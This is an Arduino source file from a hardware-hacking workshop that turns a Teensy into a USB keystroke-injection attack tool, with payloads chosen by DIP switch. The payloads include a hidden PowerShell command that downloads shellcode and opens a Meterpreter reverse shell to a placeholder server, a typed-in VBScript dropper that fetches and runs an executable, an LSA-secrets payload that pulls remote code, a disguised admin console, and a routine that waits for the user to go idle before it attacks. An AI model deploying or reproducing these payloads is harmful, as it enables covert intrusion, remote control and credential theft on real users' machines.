// HID attack tool
// ANYCon Hardware Hacking Village Workshop
// Bruce Barnett - @grymoire


// This Arduino program converts a Teensy into a HID attack tool
// It can provide several diferent attacks based on the settings of
// the DIP switch soldered to the board.

// This is inspired by Ironkeep's phukd library

// As currently configured - with a 4-position DIP switch, there are
// 16 possible different payloads


// When all switches are off - it does nothing
// When all switches are on, it prints out a short list of the different payloads by switch

// References - On the sholders of giants.....
/*
 *  http://www.irongeek.com/security/programmable-hid-usb-keystroke-dongle.htm#Programming_examples_and_my_PHUKD_library
 * http://samy.pl/usbdriveby/  - some advanced MacOX payloads
 * Brandan Geise [coldfusion] https://gist.github.com/coldfusion39/4761f1494873d14d1147
 * https://elie.net/blog/security/what-are-malicious-usb-keys-and-how-to-create-a-realistic-one
 *       make the teensy look like a thumb drive
 */


/* When you plug in a Teensy the first time to load the code something special happens
 * 
 * 
 * When you plug in your Teensy, a small pop-up window labeled "teensy" will appear, 
 * reminding you to "Press Button on Teensy to manually
 * enter Program Mode."  Press the reset button.
 * 
 * It will then say "Reboot OK:
 * 
 * 
 */


// External libraries that you may want to look at
//#include <paensy.h>


#define LED_PIN 13


// where are the DIP switches located? Make sure these are where you have them soldered
// 4 of the pins are connected to the DIP switches
// The other side of the DIP switch is connected to ground


const unsigned int dip1 = 12; 
const unsigned int dip2 = 11;
const unsigned int dip3 = 10;
const unsigned int dip4 = 9;

// VERBOSE gives you more verbose debug comments on the serial monitor
#define VERBOSE 0

// Uncomment the next line to enable debug comments
#define DEBUG

// EVIL - enable some more aggressive attacks - UNTESTED
//#define EVIL

// KEEP_AWAKE - set to true to jiggle mouse while waiting to launch
#define KEEP_AWAKE 


// Initial variables
unsigned int dips = 0;      // The current value of the DIP switches
unsigned int lastDips = 0;  // Remember last value - so we can detect a change
unsigned int debug = 0;     // extra debugging
unsigned int launched = 0;  // True if we executed the sleep and launch payload
unsigned int delayAm = 100;       // Delay - make it scalable - default 100ms
// Look at LED lights on the keyboard

int ledkeys(void) {return int(keyboard_leds);}
bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}



// TODO: improve the delay handling - make everyting scalable

// Initialize the DIP switch configurations - make a connection to
// ground to be considered ON That is, Active Low. So we need to pull
// the pins high when unused. This means we have to use the
// programmable arduino pullup resistors.

void initDip(void) {
  pinMode(dip1, INPUT_PULLUP);
  pinMode(dip2, INPUT_PULLUP);
  pinMode(dip3, INPUT_PULLUP);
  pinMode(dip4, INPUT_PULLUP);
}




/*********************************************************************
 * Returns TRUE if NUM Lock LED is on and FALSE otherwise. 
 *********************************************************************/
boolean IsNumbOn(void)
{
  if ((ledkeys() & 1) == 1){
    return true;
  } 
  else {
    return false;
    
  }      
}

/*********************************************************************
 * Returns TRUE if Scroll Lock LED is on and FALSE otherwise. 
 **********************************************************************/
boolean IsScrlOn(void)
{
  if ((ledkeys() & 4) == 4){    
    return true;
  } 
  else {
    return false;
  }      
}

void SetDelay(uint _delayAm) {
    delayAm = _delayAm;
}


void release_keys(int delay_ms) {
  Keyboard.set_key1(0);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(delay_ms);
}

void TypeLn(String chars) {
    Keyboard.print(chars);
    delay(delayAm/2);
    Keyboard.println("");
    delay(delayAm/2);
}


void ShowDiag(){
  // Change Keyboard.print to Serial.print to send output to serial monitor
  Serial.println("#Diagnostic Info");
  Serial.println("#********************************************************************");
#ifdef VERBOSE
    for (int thispin=0; thispin <40;thispin++){
      if (!digitalRead(thispin)) {
        //digitalWrite(LED_PIN, HIGH);   // set the LED on
        Serial.print(thispin);
        Serial.println(" is toggled");
      } 
#endif
 
    //  Serial.print("Analog pin 0 is: ");
    //  Serial.println(PhotoRead);
    Serial.print("# Keyboard LEDS ");
    Serial.println(ledkeys());
    Serial.print("# Num Lock: ");
    Serial.println(int(IsNumbOn()));
    Serial.print("# Caps Lock: ");
    Serial.println(bool(is_caps_on()));
    Serial.print("# Scroll Lock: ");
    Serial.println(int(IsScrlOn()));
  }
    
  Keyboard.println("#***Payloads***");
  Keyboard.println("#[1]  - Mouse Jiggle");
  Keyboard.println("#[2]  - Prank");
  Keyboard.println("#[3]  - Notebook.exe [Win]");
  Keyboard.println("#[4]  - MYTHUMB\\Myscript.bat [Win]");
  Keyboard.println("#[5]  - top [Linux]");
  Keyboard.println("#[6]  - Terminal [OSX]");
  Keyboard.println("#[7]  - Powershell [Win]");
  Keyboard.println("#[8]  - Sleep & top [Linux]");
  Keyboard.println("#[9]  - Sleep & Notebook.exe [Win]");
#ifdef EVIL
  Keyboard.println("#[10]  - lsa_secrets [Win]");
  Keyboard.println("#[11]  - download .exe [Win]");
#endif
  Keyboard.println("#[15] - This Menu");
  //  Serial.println(DIPOptions);
}





void key(int KEY, int MODIFIER)
{
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now(); // Send the key combo
  delay(20);
  release_keys(100);
}




void send_enter(int delay_ms) {
  Keyboard.set_key1((uint8_t)KEY_ENTER);
  Keyboard.send_now();
  delay(delay_ms);
  release_keys(delay_ms);
}

/**
 * Allows control key combinations.
 * Example: Ctrl(KEY_ALT) would simulate pressing the alt key while holding control.
 **/
void Ctrl(uint key) {
    Keyboard.set_modifier(MODIFIERKEY_CTRL); // Control key
    Keyboard.set_key1(key);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the key
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
}


void wait_for_drivers()
{
  while (!(keyboard_leds & 2))
    {
      key(KEY_CAPS_LOCK, 0);
    }
  if (keyboard_leds & 2)
    {
      key(KEY_CAPS_LOCK, 0);
    }
}


void Trace( unsigned int x) {
  // This routine prints "{x}" where x is the integer passed to the function.
  // You can use this as a debug aid to keep track of what is happening.
  // You could also blick the LED "x" times if you like.
  if (debug) { // Only do this for extra debug/tracing
    Serial.print("{");
    Serial.print(x);
    Serial.print("}");
  }
}



void windows_lock_screen() { // Irongeek
  digitalWrite(LED_PIN, HIGH); // set the LED on
  Keyboard.set_modifier(MODIFIERKEY_CTRL|MODIFIERKEY_ALT);
  Keyboard.set_key1((uint8_t)KEY_DELETE); // use delete key
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of control keys
  send_enter(1500);
}



//Execute command as user - from the paensy.cpp
void win_run_cmd(String Payload) {
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
  //  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1((uint8_t) KEY_R);
  Keyboard.send_now();
  release_keys(500);
  Keyboard.print("cmd.exe");
  send_enter(500);
  Keyboard.print(Payload);
  delay(500);
  send_enter(500);
  max_windows();
}


void max_windows() {
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_SHIFT);
  Keyboard.set_key1((uint8_t)KEY_M);
  Keyboard.send_now();
  release_keys(100);
}


void min_windows() {
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1((uint8_t)KEY_M);
  Keyboard.send_now();
  release_keys(100);
}

void send_caps() {
  Keyboard.set_key1((uint8_t)KEY_CAPS_LOCK);
  Keyboard.send_now();
  release_keys(100);
}


void ctrl_alt() {
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  release_keys(100);
}

void isWindows() {

  delay(3000);
  
}

/**
 * Allows alt key combinations.
 * Example: Alt(KEY_ESC) would simulate pressing the escape key while holding alt.
 **/
void Alt(uint key) {
    Keyboard.set_modifier(MODIFIERKEY_ALT); // Alt key
    Keyboard.set_key1(key);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the key
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
}


/**
 * Presses a key as many times as specified.
 * PressKey(KEY_TAB, 10) would press the tab key 10 times.
 **/
void PressKey(uint key, uint amount) {
    for(uint i = 0; i < amount; i++) {
        Keyboard.set_key1(key);
        Keyboard.send_now();
        Keyboard.set_key1(0);
        Keyboard.send_now();
        delay(delayAm/8);
    }
}


// Linux stuff- launch an applicatioN using the Ubuntu Dash
// If the user has it set up, it can search the internet
void linux_run_app(String SomeApp){
  Keyboard.set_modifier(MODIFIERKEY_ALT); //Hold Alt key
  Keyboard.set_key1((uint8_t)KEY_F2); // use F2 key
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of  control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(1500);
  Keyboard.print(SomeApp);
  send_enter(500);
}


// Linux stuff
void linux_run_cmd_in_term(String SomeCommand){
  //digitalWrite(ledPin, HIGH);   // set the LED on
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1((uint8_t)KEY_T); // press control-alt-T
  Keyboard.send_now(); // send strokes
  Keyboard.set_modifier(0); //prep release of  control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(1500);
  Keyboard.print(SomeCommand);
  send_enter(500);
}



void osx_run_cmd(String SomeCommand){
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1((uint8_t)KEY_SPACE); // use Space key
  Keyboard.send_now(); // send strokes
  delay(1500);  // Weird timing for slow systems
  Keyboard.set_modifier(0); //prep release of  control keys
  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
  Keyboard.send_now(); //Send the key changes
  delay(1000);
  Keyboard.print(SomeCommand);
  delay(1000);
  send_enter(500);
}

// "Exploits" Here
// These are selected based on the DIP switch values
//

void mouse_jiggle() {
  // Move the mouse just a little - to keep the computer from falling asleep
  // ThIs moves the mouse +/- 5 pixels every 1/2 second
  Mouse.move(random(-5, 5) ,random(-5, 5) );
  digitalWrite(LED_PIN, LOW); // by default - turn off LED
  delay(5000);
}
void mouse_move_prank() {
  // Move the mouse more than the jiggle. Then clicK - to change focus/insert location.
  // Do this every 5-30 seconds
  // This can drive someone crazy
  
  Mouse.move(random(-100, 100) ,random(-100, 100) );
  Mouse.click();
  

  if ((random(0,100)>75)) { // 25% of the tIme turn on CAPS LOCK
    key(KEY_CAPS_LOCK, 0);
  }
  
  digitalWrite(LED_PIN, LOW); // by default - turn off LED
  delay(random(5000,30*1000)); // Delay 5-30 seconds
}


void win_was_hacked() {
  isWindows();
  win_run_cmd("notepad.exe");
  delay(1000);
  Keyboard.print("You were hacked!!! :)");
  // Open up the window menu.
  Alt(KEY_SPACE);
  
  // Maximize the window.
  PressKey(KEY_X, 1);
}


void win_powershell_meterpreter() {

  // From Brandan Geise [coldfusion]  
  ctrl_alt();
  send_caps();
  min_windows();
  delay(500);
  win_run_cmd("powershell -ep bypass -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER.com/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YOUR_IP -Lport 443 -Force");
}

/*
  This exploit sends a command to the run bar, finds the drive letter by its volume name (MYTHUMB in
  this example, and case sensitive), then runs your script. Thanks to Tim Medin for this more
  elegant command line then what I had for finding the
  thumbdrive by volume name.
*/
void win_myscript () {
  win_run_cmd("cmd /c for /F %i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \"MYTHUMB\"') do %i\\myscript.bat");
}


void linux_top() {
  linux_run_cmd_in_term("top");
}


void osx_terminal() {
  osx_run_cmd("Terminal"); // See Samy's page for a better payload
}



// Adding this temporarily while debugging?

bool cmd_admin(unsigned int reps, int millisecs)
{
  make_sure_capslock_is_off();
  delay(700);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(3000);
  Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  send_enter(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  delay(7000);
  send_left_enter();
  delay(4000);
  create_click_capslock_win();
  check_for_capslock_success_teensy(reps,millisecs);
  return true;
}



// Maybe get rid of this as well
void make_sure_capslock_is_off(void)
{
  if (is_caps_on())
    {
      delay(500);
      Keyboard.set_key1((uint8_t)KEY_CAPS_LOCK);
      Keyboard.send_now();
      delay(200);
      delay(700);
      Keyboard.set_modifier(0);
      Keyboard.set_key1(0);
      Keyboard.send_now();
      delay(500);
      delay(700);
    }
}


void send_left_enter(){
  delay(1000);
  Keyboard.set_key1((uint8_t)KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1((uint8_t)KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void minimize_windows(void)
{
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1((uint8_t)KEY_M);
  Keyboard.send_now();
  delay(300);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  delay(300);
}


void reset_windows_desktop(int sleep)
{
  delay(1000);
  minimize_windows();
  delay(sleep);
  minimize_windows();
  delay(sleep);
  minimize_windows();
  delay(200);
}

void create_click_capslock_win()
{
  Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\\\capslock.vbs");
  delay(400);
  Keyboard.println("wscript %temp%\\\\capslock.vbs");
  delay(2000);
}

bool check_for_capslock_success_teensy(unsigned int reps, int millisecs)
{
  unsigned int i = 0;
  do
    {
      delay(millisecs);
      if (is_caps_on())
        {
          make_sure_capslock_is_off();
          delay(700);
          return true;
        }
      i++;
    }
  while (!is_caps_on() && (i<reps));
  return false;
}


void downloadSetup() {
  
  String fileName = "CONFIGURE ME (example: program.exe)", fileLink = "http://www.example.com/Shadow/pwned.exe";
  
  
  // Turn on the LED pin so we know the device is running.
  //  digitalWrite(LED_PIN, HIGH);
  
  isWindows();
  
  // Open up the command prompt in a hidden fashion.
  win_run_cmd("cmd /Q /D /T:7F /F:OFF /V:ON /K");
  
  delay(500);
  
  // Delete the script if it exists.
  TypeLn("del download.vbs");
  
  // Start recording what's typed.
  TypeLn("copy con download.vbs");
  
  // Start typing the download script.
  TypeLn("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  TypeLn("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  TypeLn("If objXMLHTTP.Status = 200 Then");
  TypeLn("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  TypeLn("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  TypeLn("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  TypeLn("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ");
  TypeLn("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  
  // Save the screen contents.
  Ctrl(KEY_Z);
  
  PressKey(KEY_ENTER, 1);
  
  // Download our file using our script.
  TypeLn("cscript download.vbs " + fileLink);
  
  // Execute the file and then exit.
  TypeLn(fileName + " && exit");
    
}
void lsa_secrets() {
  minimize_windows();
  delay(500);
  while(!cmd_admin(3,500))
    {
      reset_windows_desktop(2000);
    }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  LSA Secrets\" > %temp%\\dl.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\dl.ps1");
  Keyboard.println("echo $pv = iex $wc.DownloadString(\"INPUT4\") >> %temp%\\dl.ps1");
  String fn = "dl";
  String fp;
  //  EXFILCALLS

    Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs");
  Keyboard.println("echo arch = GetObject(\"winmgmts:root\\cimv2:Win32_Processor='cpu0'\").AddressWidth >> %temp%\\dl.vbs");
  Keyboard.println("echo If arch = \"32\" then >> %temp%\\dl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs");
  Keyboard.println("echo elseif arch = \"64\" then >> %temp%\\dl.vbs");
  Keyboard.println("echo oShell.Run(\"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs");
  Keyboard.println("echo end If >> %temp%\\dl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dl.vbs");
  delay(3000);
  Keyboard.println("exit");

}


boolean sleep_and_launch() {
  // This routine will sleep until it senses no one is using the system. Then it strikes!
  //
  const unsigned int pause = 10; // seconds to wait while testing current state of capslock
  const unsigned int longwait = 3; // Minutes to wait after user action is detected
  const unsigned int max_wait = 10; // how many minutes must the user be idle before we launch an attack?

// Initialize
  //  Serial.println("Enter Sleep Test");
  if (launched) {return false;} // Only do this once



  if (!is_caps_on()){send_caps();} // If caps lock is not on - then turn it on
  unsigned int seconds_idle = 0; // seconds idle
  unsigned int elapsed = 0; // seconds elapsed in this routine 
  
  while (elapsed<(max_wait*60) ) { //how long do we wait?
    delay(pause * 1000); //Delay between caps lock check iterations

    seconds_idle = seconds_idle + pause ;
    elapsed = elapsed + pause;
    if (is_caps_on()) {
      delay(pause * 1000); //Delay after caps lock is found to be on
      seconds_idle = seconds_idle + pause;
      elapsed = elapsed + pause;
#ifdef KEEP_AWAKE
      Mouse.move(random(-5, 5) ,random(-5, 5) );
#endif
#ifdef DEBUG
      Serial.print("Idle for ");
      Serial.print(seconds_idle);
      Serial.println(" seconds");
#endif
    } else { // caps_lock was toggled
      // Oh - they are typing. Better sleep for a while
#ifdef DEBUG
      Serial.print("The user is busy, let's sleep for  ");
      Serial.print(longwait);
      Serial.println(" minutes and try again.");
#endif
      Mouse.move(random(-5, 5) ,random(-5, 5) );
      delay(longwait*60*1000); // wait $longwait minutes
      Mouse.move(random(-5, 5) ,random(-5, 5) );
      elapsed = elapsed + (longwait*60);
      seconds_idle = 0;
    } // End of if is_caps_on(){...

  } // End while
#ifdef DEBUG
      Serial.println("End of wait loop");
#endif
    // If we got here - then perhaps we want to launch an attack.
    // how long have we waited?
#ifdef DEBUG
      Serial.print("End Loop, Idle for ");
      Serial.print(seconds_idle);
      Serial.println(" seconds");
#endif
    if (seconds_idle >= (max_wait * 60)) {
      if (is_caps_on()){send_caps();} // If caps lock is on - then turn it off - Linux cares
      launched=1; // Only attack once
#ifdef DEBUG
      Serial.println("Launch attack");
#endif
      return true;
    }
    return false;

  
}

// MAIN CODE
void setup() {
  // Put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW); // turn off LED
  lastDips=0;
  initDip();
  SetDelay(100); // Specify a delay - which can be increased
}


void loop() {


  Trace(0);
  wait_for_drivers();
  Trace(1);
  digitalWrite(LED_PIN, LOW); // by default - turn off LED

  lastDips=dips;
  dips=0;
  delay(500);

  // Read the 4 DIP switches to get 1 of 16 different values
  !digitalReadFast(dip1) && (dips+=1);
  !digitalReadFast(dip2) && (dips+=2);
  !digitalReadFast(dip3) && (dips+=4);
  !digitalReadFast(dip4) && (dips+=8);
                   

  /* If all of the DIPs are "off", then dips==0 - and we do nothing.
   * We want an "idle state for the dips - this makes it easier to debug.
   * First turn all switches off, then turn them on to the new setting
   * Also - only print a message if the switches change from last time....
   */

  Trace(2);
  if ((dips>0) && (dips != lastDips)) { // If DIPs are set and different...
    
    // I'm doing something!! - turn on the LED when I start. Trun off when done
    digitalWrite(LED_PIN, HIGH);
    // Print the value of the DIP swItches/payloads to the searial monitor
    Serial.print("[");
    Serial.print(dips); /* print the current value */
    Serial.print("]");
  }
  Trace(3);

  if (dips==0) { ;}
  else if (dips==1) { mouse_jiggle();}
  else if (dips==2) { mouse_move_prank();}
  else if (dips==3) { win_was_hacked(); }
  else if (dips==4) { win_myscript();}
  else if (dips==5) { linux_top();}
  else if (dips==6) { osx_terminal();}
  else if (dips==7) { win_powershell_meterpreter();}
  else if (dips==8) { if(sleep_and_launch()){linux_top();}}
  else if (dips==9) { if(sleep_and_launch()){win_was_hacked();}}
#ifdef EVIL
  else if (dips==10) { lsa_secrets();}
  else if (dips==11) { downloadSetup();}
#endif
  /*
    else if (dips==12) { xxx();}
    else if (dips==13) { xxx();}
    else if (dips==14) { xxx();}
  */
  
  else if (dips==15) { ShowDiag();}
  else {Serial.print("NoPayloadFor");Serial.println(dips); delay(2000);}
  Trace(4);
  digitalWrite(LED_PIN, LOW);
  delay(5000);
}


// Local Variables:
// mode: c++
// End:
